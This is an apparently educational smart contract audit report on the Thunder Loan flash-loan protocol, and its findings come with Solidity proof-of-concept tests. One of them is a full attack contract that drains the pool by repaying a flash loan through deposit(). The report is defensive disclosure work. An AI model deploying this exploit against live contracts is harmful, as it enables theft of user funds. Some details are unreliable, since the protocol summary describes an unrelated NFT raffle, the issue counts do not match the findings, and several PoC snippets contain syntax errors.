---
title: Thunder Loan Audit Report
author: Thomas Heim
date: February 24, 2024
header-includes:
  - \usepackage{titling}
  - \usepackage{graphicx}
---

\begin{titlepage}
\centering
\begin{figure}[h]
\centering
\includegraphics[width=0.5\textwidth]{logo.pdf}
\end{figure}
\vspace{2cm}
{\Huge\bfseries TSwapPool Initial Audit Report\par}
\vspace{1cm}
{\Large Version 0.1\par}
\vspace{2cm}
{\Large\itshape Thomas Heim\par}
\vfill
{\large \today\par}
\end{titlepage}

\maketitle

# Thunder Loan Audit Report

Lead Auditors:
Thomas Heim

# Table of contents

<details>

<summary>See table</summary>

- [Thunder Loan Audit Report](#thunder-loan-audit-report)
- [Table of contents](#table-of-contents)
- [About Thomas Heim](#about-thomas-heim)
- [Disclaimer](#disclaimer)
- [Risk Classification](#risk-classification)
- [Audit Details](#audit-details)
  - [Scope](#scope)
- [Protocol Summary](#protocol-summary)
  - [Roles](#roles)
- [Executive Summary](#executive-summary)
  - [Issues found](#issues-found)
- [Findings](#findings)
  - [High](#high)
    - [\[H-1\] Erroneous 'ThunderLoan::updateExchangeRate' in the 'deposit' function causes protocol to think it has more fees than it really does, which blocks redemption and incorrectly sets the exchange rate.](#h-1-erroneous-thunderloanupdateexchangerate-in-the-deposit-function-causes-protocol-to-think-it-has-more-fees-than-it-really-does-which-blocks-redemption-and-incorrectly-sets-the-exchange-rate)
    - [\[H-2\] All the funds can be stolen if the flash loan is returned using deposit()](#h-2-all-the-funds-can-be-stolen-if-the-flash-loan-is-returned-using-deposit)
    - [\[H-3\] Mixing up variable location causes storage collision i 'ThunderLoan::s_flashLoanFee' and 'ThunderLoan::s_currentlyFlashLoaning', freezing protocol](#h-3-mixing-up-variable-location-causes-storage-collision-i-thunderloans_flashloanfee-and-thunderloans_currentlyflashloaning-freezing-protocol)
  - [Medium](#medium)
    - [\[M-1\] Using TSwap as price oracle leads to price and oracle manipulation attack](#m-1-using-tswap-as-price-oracle-leads-to-price-and-oracle-manipulation-attack)
    - [\[M-2\] Centralization risk for trusted owners](#m-2-centralization-risk-for-trusted-owners)
      - [Impact:](#impact)
      - [Contralized owners can brick redemptions by disapproving of a specific token](#contralized-owners-can-brick-redemptions-by-disapproving-of-a-specific-token)
  - [Low](#low)
    - [\[L-1\] Empty Function Body - Consider commenting why](#l-1-empty-function-body---consider-commenting-why)
    - [\[L-2\] Initializers could be front-run](#l-2-initializers-could-be-front-run)
    - [\[L-3\] Missing critial event emissions](#l-3-missing-critial-event-emissions)
  - [Informational](#informational)
    - [\[I-1\] Poor Test Coverage](#i-1-poor-test-coverage)
    - [\[I-2\] Not using `__gap[50]` for future storage collision mitigation](#i-2-not-using-__gap50-for-future-storage-collision-mitigation)
    - [\[I-3\] Different decimals may cause confusion. ie: AssetToken has 18, but asset has 6](#i-3-different-decimals-may-cause-confusion-ie-assettoken-has-18-but-asset-has-6)
    - [\[I-4\] Doesn't follow https://eips.ethereum.org/EIPS/eip-3156](#i-4-doesnt-follow-httpseipsethereumorgeipseip-3156)
  - [Gas](#gas)
    - [\[GAS-1\] Using bools for storage incurs overhead](#gas-1-using-bools-for-storage-incurs-overhead)
    - [\[GAS-2\] Using `private` rather than `public` for constants, saves gas](#gas-2-using-private-rather-than-public-for-constants-saves-gas)
    - [\[GAS-3\] Unnecessary SLOAD when logging new exchange rate](#gas-3-unnecessary-sload-when-logging-new-exchange-rate)

# About Thomas Heim

Thomas Heim is a detail-oriented smart contract auditor with expertise in Solidity. He specializes in conducting thorough audits of smart contracts to ensure the security and reliability of your smart contracts. Thomas is committed to continually assessing and improving security through an ongoing consensus process. His approach is professional and thorough, making him a reliable choice for those in need of a trustworthy smart contract auditing service.

# Disclaimer

The team makes all effort to find as many vulnerabilities in the code in the given time period, but holds no responsibilities for the findings provided in this document. A security audit by the team is not an endorsement of the underlying business or product. The audit was time-boxed and the review of the code was solely on the security aspects of the Solidity implementation of the contracts.

# Risk Classification

|            |        | Impact |        |     |
| ---------- | ------ | ------ | ------ | --- |
|            |        | High   | Medium | Low |
|            | High   | H      | H/M    | M   |
| Likelihood | Medium | H/M    | M      | M/L |
|            | Low    | M      | M/L    | L   |

# Audit Details

**The findings described in this document correspond the following commit hash:**

```
026da6e73fde0dd0a650d623d0411547e3188909
```

## Scope

```
#-- interfaces
|   #-- IFlashLoanReceiver.sol
|   #-- IPoolFactory.sol
|   #-- ITSwapPool.sol
|   #-- IThunderLoan.sol
#-- protocol
|   #-- AssetToken.sol
|   #-- OracleUpgradeable.sol
|   #-- ThunderLoan.sol
#-- upgradedProtocol
    #-- ThunderLoanUpgraded.sol
```

# Protocol Summary

Puppy Rafle is a protocol dedicated to raffling off puppy NFTs with variying rarities. A portion of entrance fees go to the winner, and a fee is taken by another address decided by the protocol owner.

## Roles

- Owner: The owner of the protocol who has the power to upgrade the implementation.
- Liquidity Provider: A user who deposits assets into the protocol to earn interest.
- User: A user who takes out flash loans from the protocol.

# Executive Summary

## Issues found

| Severity | Number of issues found |
| -------- | ---------------------- |
| High     | 3                      |
| Medium   | 2                      |
| Low      | 3                      |
| Info     | 1                      |
| Gas      | 2                      |
| Total    | 11                     |

# Findings

## High

### [H-1] Erroneous 'ThunderLoan::updateExchangeRate' in the 'deposit' function causes protocol to think it has more fees than it really does, which blocks redemption and incorrectly sets the exchange rate.

**Description:** In the ThunderLoan system, the 'exhangeRate' is responsible for calculating the exchange rate between assetTokens and underlying tokens. In a way, it`s responsible for keeping track of how many fees to give to liqudity providers.

However, the 'deposit' function, updates this rate, without collecting any fees! This update should be removed.

```javascript

    function deposit(IERC20 token, uint256 amount) external revertIfZero(amount) revertIfNotAllowedToken(token) {
        AssetToken assetToken = s_tokenToAssetToken[token];
        uint256 exchangeRate = assetToken.getExchangeRate();
        uint256 mintAmount = (amount * assetToken.EXCHANGE_RATE_PRECISION()) / exchangeRate;
        emit Deposit(msg.sender, token, amount);
        assetToken.mint(msg.sender, mintAmount);
        uint256 calculatedFee = getCalculatedFee(token, amount);
        assetToken.updateExchangeRate(calculatedFee);
        token.safeTransferFrom(msg.sender, address(assetToken), amount);
    }

```

**Impact:** There are several impacts to this bug.

1. The 'redeem' function is blocked, because the protocol thinks the owed tokens is more than it has.
2. Rewards are incorrectly calculated,leading to liquidity providers potentially getting way more or less than deserved.

**Proof of Concept:**

1.  LP deposits.
2.  User takes out a flash loan.
3.  It is now impossible for LP to redeem.
    <details>
    <summary> Proof of Code</summary>

    Place the following into 'ThunderLoanTest.t.sol'

    ```javascript
           function testRedeemAfterLoan() public setAllowedToken hasDeposits {
            uint256 amountToBorrow = AMOUNT * 10;
            uint256 calculatedFee = thunderLoan.getCalculatedFee(tokenA, amountToBorrow);

            vm.startPrank(user);
            tokenA.mint(address(mockFlashLoanReceiver), calculatedFee);
            thunderLoan.flashloan(address(mockFlashLoanReceiver), tokenA, amountToBorrow, "");
            vm.stopPrank();

            uint256 amountToRedeem = type(uint256).max;
            vm.startPrank(liquidityProvider);
            thunderLoan.redeem(tokenA, amountToRedeem);
    ```

</details>

**Recommended Mitigation:** Remove the incorrectly updated exchange rate lines form 'deposit'

```diff
       function deposit(IERC20 token, uint256 amount) external revertIfZero(amount) revertIfNotAllowedToken(token) {
        AssetToken assetToken = s_tokenToAssetToken[token];
        uint256 exchangeRate = assetToken.getExchangeRate();
        uint256 mintAmount = (amount * assetToken.EXCHANGE_RATE_PRECISION()) / exchangeRate;
        emit Deposit(msg.sender, token, amount);
        assetToken.mint(msg.sender, mintAmount);
-       uint256 calculatedFee = getCalculatedFee(token, amount);
-       assetToken.updateExchangeRate(calculatedFee);
        token.safeTransferFrom(msg.sender, address(assetToken), amount);
    }

```

### [H-2] All the funds can be stolen if the flash loan is returned using deposit()

**Description:** The flashloan() performs a crucial balance check to ensure that the ending balance, after the flash loan, exceeds the initial balance, accounting for any borrower fees. This verification is achieved by comparing endingBalance with startingBalance + fee. However, a vulnerability emerges when calculating endingBalance using token.balanceOf(address(assetToken)).

Exploiting this vulnerability, an attacker can return the flash loan using the deposit() instead of repay(). This action allows the attacker to mint AssetToken and subsequently redeem it using redeem(). What makes this possible is the apparent increase in the Asset contract's balance, even though it resulted from the use of the incorrect function. Consequently, the flash loan doesn't trigger a revert.

**Impact:** All the funds of the AssetContract can be stolen.

**Proof of Concept:** To execute the test successfully, please complete the following steps:

1. Place the **`attack.sol`** file within the mocks folder.
1. Import the contract in **`ThunderLoanTest.t.sol`**.
1. Add **`testattack()`** function in **`ThunderLoanTest.t.sol`**.
1. Change the **`setUp()`** function in **`ThunderLoanTest.t.sol`**.

```Solidity
import { Attack } from "../mocks/attack.sol";
```

```Solidity
function testattack() public setAllowedToken hasDeposits {
        uint256 amountToBorrow = AMOUNT * 10;
        vm.startPrank(user);
        tokenA.mint(address(attack), AMOUNT);
        thunderLoan.flashloan(address(attack), tokenA, amountToBorrow, "");
        attack.sendAssetToken(address(thunderLoan.getAssetFromToken(tokenA)));
        thunderLoan.redeem(tokenA, type(uint256).max);
        vm.stopPrank();

        assertLt(tokenA.balanceOf(address(thunderLoan.getAssetFromToken(tokenA))), DEPOSIT_AMOUNT);
    }
```

```Solidity
function setUp() public override {
        super.setUp();
        vm.prank(user);
        mockFlashLoanReceiver = new MockFlashLoanReceiver(address(thunderLoan));
        vm.prank(user);
        attack = new Attack(address(thunderLoan));
    }
```

attack.sol

```Solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.20;

import { IERC20 } from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import { SafeERC20 } from "@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol";
import { IFlashLoanReceiver } from "../../src/interfaces/IFlashLoanReceiver.sol";

interface IThunderLoan {
    function repay(address token, uint256 amount) external;
    function deposit(IERC20 token, uint256 amount) external;
    function getAssetFromToken(IERC20 token) external;
}


contract Attack {
    error MockFlashLoanReceiver__onlyOwner();
    error MockFlashLoanReceiver__onlyThunderLoan();

    using SafeERC20 for IERC20;

    address s_owner;
    address s_thunderLoan;

    uint256 s_balanceDuringFlashLoan;
    uint256 s_balanceAfterFlashLoan;

    constructor(address thunderLoan) {
        s_owner = msg.sender;
        s_thunderLoan = thunderLoan;
        s_balanceDuringFlashLoan = 0;
    }

    function executeOperation(
        address token,
        uint256 amount,
        uint256 fee,
        address initiator,
        bytes calldata /*  params */
    )
        external
        returns (bool)
    {
        s_balanceDuringFlashLoan = IERC20(token).balanceOf(address(this));

        if (initiator != s_owner) {
            revert MockFlashLoanReceiver__onlyOwner();
        }

        if (msg.sender != s_thunderLoan) {
            revert MockFlashLoanReceiver__onlyThunderLoan();
        }
        IERC20(token).approve(s_thunderLoan, amount + fee);
        IThunderLoan(s_thunderLoan).deposit(IERC20(token), amount + fee);
        s_balanceAfterFlashLoan = IERC20(token).balanceOf(address(this));
        return true;
    }

    function getbalanceDuring() external view returns (uint256) {
        return s_balanceDuringFlashLoan;
    }

    function getBalanceAfter() external view returns (uint256) {
        return s_balanceAfterFlashLoan;
    }

    function sendAssetToken(address assetToken) public {

        IERC20(assetToken).transfer(msg.sender, IERC20(assetToken).balanceOf(address(this)));
    }
}
```

Notice that the **`assetLt()`** checks whether the balance of the AssetToken contract is less than the **`DEPOSIT_AMOUNT`**, which represents the initial balance. The contract balance should never decrease after a flash loan, it should always be higher.

**Recommended Mitigation:** Add a check in deposit() to make it impossible to use it in the same block of the flash loan. For example registring the block.number in a variable in flashloan() and checking it in deposit().

### [H-3] Mixing up variable location causes storage collision i 'ThunderLoan::s_flashLoanFee' and 'ThunderLoan::s_currentlyFlashLoaning', freezing protocol

**Description:** 'ThunderLoan.sol' has two variables in the following order:

```java
    uint256 private s_feePrecision;
    uint256 private s_flashLoanFee;
```

However, the upgraded contract 'ThunderLoanUpgraded.sol' has them in a different order:

```javascript
    uint256 private s_flashLoanFee;
    uint256 public constant FEE_PRECISION = 1e18;

```

Due to how Solidity storage works, after the upgrade the 's_flashLoanFee' will have the value of 's_feePrecision'. You can adjust the position of storage variables, and removing storage variables for constant variables, breaks the storage location as well.

**Impact:** After the upgrade, the 's_flashLoanFee' will hva the value of 's_feePrecision'. This means that users who take out flash loan right after an upgrade will be charged the wrong fee.

More importantly, the 's_currentlyFlashLianing' mapping will start in the wrong storage slot.

**Proof of Concept:**

<details>
<summary>PoC</summary>

Place the following into 'ThunderLoanTest.t.sol'

```javascript
import { ThunderLoanUpgraded } from "../../src/upgradedProtocol/ThunderLoanUpgraded.sol";
.
.
.

    function testUpgradeBreaks() public public {
        uint256 feeBeforeUpgrade = thunderLoan.getFee();
        vm.startPrank(thunderLoan.owner());
        ThunderLoanUpgraded upgraded = new ThunderLoanUpgraded();
        thunderLoan.upgradedToCall(address(upgraded), "");
        uint256 feeAfterUpgrade = thunderLoan.getFee();
        vm.stopPrank();

        console2.log("Fee before: ", feeBeforeUpgrade );
        console2.log("Fee before: ", feeAfterUpgrade );
        asset(feeBeforeUpgrade != feeAfterUpgrade)

    }
```

You can also see the storage layout difference by running 'forge inspect ThunderLoan storage' and 'forge inspect ThunderLoanUpgraded storage'.

</details>

**Recommended Mitigation:** If you must remove the storage variable, leave it as blank as to not mess up the storage slots.

```diff
-   uint256 private s_flashLoanFee;
-   uint256 public constant FEE_PRECISION = 1e18;
+    uint256 private s_blank;
+    uint256 private s_flashLoanFee;
+    uint256 public constant FEE_PRECISION = 1e18;

```

## Medium

### [M-1] Using TSwap as price oracle leads to price and oracle manipulation attack

**Description:** The TSwap protocol is a constant product formula based on AMM(automated market maker). The price of a token is determined by how many reserves are on either side of the pool. Because of this, it is easy for malicious user to manipulate the price of a token by buying or selling a large amount of the token in the same transaction, essentially ignoring protocol fees.

**Impact:** Liquidity providers will drastically reduced fees for providing liquidity.

**Proof of Concept:**
The following all happens in 1 transaction.

1. User takes a flash loan from 'ThunderLoan' for 1000 'tokenA'. They are charged the original fee 'fee1'. During the flash loan, they do the following;
   1. User sells 1000 'fee1', tanking the price.
   2. Instead of repaying right away, the user takes out another flash loan for another 1000 'tokenA'. 4. Due to the fact that the way 'ThunderLoan' calculates price based on the 'TSwapPool' this second flash loan is substantially cheaper.

```javascript
    function getPriceInWeth(address token) public view returns (uint256) {
        address swapPoolOfToken = IPoolFactory(s_poolFactory).getPool(token);
        return ITSwapPool(swapPoolOfToken).getPriceOfOnePoolTokenInWeth();
    }
```

2. The user then repays the first flash loan, and then repays the second flash loan.

**Recommended Mitigation:** Consider using a different price mechanism, like a Chanlink price feed with a Uniswap TWAP fallback oracle.

### [M-2] Centralization risk for trusted owners

#### Impact:

Contracts have owners with privileged rights to perform admin tasks and need to be trusted to not perform malicious updates or drain funds.

_Instances (2)_:

```solidity
File: src/protocol/ThunderLoan.sol

223:     function setAllowedToken(IERC20 token, bool allowed) external onlyOwner returns (AssetToken) {

261:     function _authorizeUpgrade(address newImplementation) internal override onlyOwner { }
```

#### Contralized owners can brick redemptions by disapproving of a specific token

## Low

### [L-1] Empty Function Body - Consider commenting why

_Instances (1)_:

```solidity
File: src/protocol/ThunderLoan.sol

261:     function _authorizeUpgrade(address newImplementation) internal override onlyOwner { }

```

### [L-2] Initializers could be front-run

Initializers could be front-run, allowing an attacker to either set their own values, take ownership of the contract, and in the best case forcing a re-deployment

_Instances (6)_:

```solidity
File: src/protocol/OracleUpgradeable.sol

11:     function __Oracle_init(address poolFactoryAddress) internal onlyInitializing {

```

```solidity
File: src/protocol/ThunderLoan.sol

138:     function initialize(address tswapAddress) external initializer {

138:     function initialize(address tswapAddress) external initializer {

139:         __Ownable_init();

140:         __UUPSUpgradeable_init();

141:         __Oracle_init(tswapAddress);

```

### [L-3] Missing critial event emissions

**Description:** When the `ThunderLoan::s_flashLoanFee` is updated, there is no event emitted.

**Recommended Mitigation:** Emit an event when the `ThunderLoan::s_flashLoanFee` is updated.

```diff
+    event FlashLoanFeeUpdated(uint256 newFee);
.
.
.
    function updateFlashLoanFee(uint256 newFee) external onlyOwner {
        if (newFee > s_feePrecision) {
            revert ThunderLoan__BadNewFee();
        }
        s_flashLoanFee = newFee;
+       emit FlashLoanFeeUpdated(newFee);
    }
```

## Informational

### [I-1] Poor Test Coverage

```
Running tests...
| File                               | % Lines        | % Statements   | % Branches    | % Funcs        |
| ---------------------------------- | -------------- | -------------- | ------------- | -------------- |
| src/protocol/AssetToken.sol        | 70.00% (7/10)  | 76.92% (10/13) | 50.00% (1/2)  | 66.67% (4/6)   |
| src/protocol/OracleUpgradeable.sol | 100.00% (6/6)  | 100.00% (9/9)  | 100.00% (0/0) | 80.00% (4/5)   |
| src/protocol/ThunderLoan.sol       | 64.52% (40/62) | 68.35% (54/79) | 37.50% (6/16) | 71.43% (10/14) |
```

### [I-2] Not using `__gap[50]` for future storage collision mitigation

### [I-3] Different decimals may cause confusion. ie: AssetToken has 18, but asset has 6

### [I-4] Doesn't follow https://eips.ethereum.org/EIPS/eip-3156

**Recommended Mitigation:** Aim to get test coverage up to over 90% for all files.

## Gas

### [GAS-1] Using bools for storage incurs overhead

Use `uint256(1)` and `uint256(2)` for true/false to avoid a Gwarmaccess (100 gas), and to avoid Gsset (20000 gas) when changing from ‘false’ to ‘true’, after having been ‘true’ in the past. See [source](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/58f635312aa21f947cae5f8578638a85aa2519f5/contracts/security/ReentrancyGuard.sol#L23-L27).

_Instances (1)_:

```solidity
File: src/protocol/ThunderLoan.sol

98:     mapping(IERC20 token => bool currentlyFlashLoaning) private s_currentlyFlashLoaning;

```

### [GAS-2] Using `private` rather than `public` for constants, saves gas

If needed, the values can be read from the verified contract source code, or if there are multiple values there can be a single getter function that [returns a tuple](https://github.com/code-423n4/2022-08-frax/blob/90f55a9ce4e25bceed3a74290b854341d8de6afa/src/contracts/FraxlendPair.sol#L156-L178) of the values of all currently-public constants. Saves **3406-3606 gas** in deployment gas due to the compiler not having to create non-payable getter functions for deployment calldata, not having to store the bytes of the value outside of where it's used, and not adding another entry to the method ID table

_Instances (3)_:

```solidity
File: src/protocol/AssetToken.sol

25:     uint256 public constant EXCHANGE_RATE_PRECISION = 1e18;

```

```solidity
File: src/protocol/ThunderLoan.sol

95:     uint256 public constant FLASH_LOAN_FEE = 3e15; // 0.3% ETH fee

96:     uint256 public constant FEE_PRECISION = 1e18;

```

### [GAS-3] Unnecessary SLOAD when logging new exchange rate

In `AssetToken::updateExchangeRate`, after writing the `newExchangeRate` to storage, the function reads the value from storage again to log it in the `ExchangeRateUpdated` event.

To avoid the unnecessary SLOAD, you can log the value of `newExchangeRate`.

```diff
  s_exchangeRate = newExchangeRate;
- emit ExchangeRateUpdated(s_exchangeRate);
+ emit ExchangeRateUpdated(newExchangeRate);
```
